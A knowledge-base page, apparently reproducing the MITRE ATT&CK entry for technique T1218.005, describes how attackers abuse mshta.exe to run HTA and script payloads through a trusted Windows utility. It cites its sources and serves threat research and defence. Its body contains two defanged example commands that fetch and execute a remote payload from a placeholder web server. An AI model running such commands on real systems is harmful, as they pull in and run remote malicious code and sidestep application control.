---
mitre_data:
  id: T1218.005
  linker_tags:
  - mitre/attack/linker/stealth/mshta
  name: Mshta
  related_tactics:
  - stealth
tags:
- mitre/attack/technique
---



# Mshta (`T1218.005`)

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code [^fn4] [^fn6] [^fn1] [^fn3] [^fn2] 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. [^fn8] HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. [^fn7]

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. [^fn5]


# Platform(s)

- Windows

# Parent Technique(s)

- [[../Techniques/System Binary Proxy Execution (T1218)|System Binary Proxy Execution]]

# Tool(s)

- [[../Tools/Covenant|Covenant]]
- [[../Tools/Koadic|Koadic]]

# Tactic(s)

- [[../Tactics/7. Stealth|Stealth]]


# External Reference(s)

- [T1218.005](https://attack.mitre.org/techniques/T1218/005)

[^fn1]: [Berry, A., Galang, L., Jiang, G., Leathery, J., Mohandas, R. (2017, April 11). CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler. Retrieved October 27, 2017.](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)
[^fn2]: [Carr, N., et al. (2017, April 24). FIN7 Evolution and the Phishing LNK. Retrieved April 24, 2017.](https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html)
[^fn3]: [Dove, A. (2016, March 23). Fileless Malware – A Behavioural Analysis Of Kovter Persistence. Retrieved December 5, 2017.](https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/)
[^fn4]: [Gross, J. (2016, February 23). Operation Dust Storm. Retrieved December 22, 2021.](https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf)
[^fn5]: [LOLBAS. (n.d.). Mshta.exe. Retrieved July 31, 2019.](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
[^fn6]: [McCammon, K. (2015, August 14). Microsoft HTML Application (HTA) Abuse, Part Deux. Retrieved October 27, 2017.](https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/)
[^fn7]: [Microsoft. (n.d.). HTML Applications. Retrieved October 27, 2017.](https://msdn.microsoft.com/library/ms536471.aspx)
[^fn8]: [Wikipedia. (2017, October 14). HTML Application. Retrieved October 27, 2017.](https://en.wikipedia.org/wiki/HTML_Application)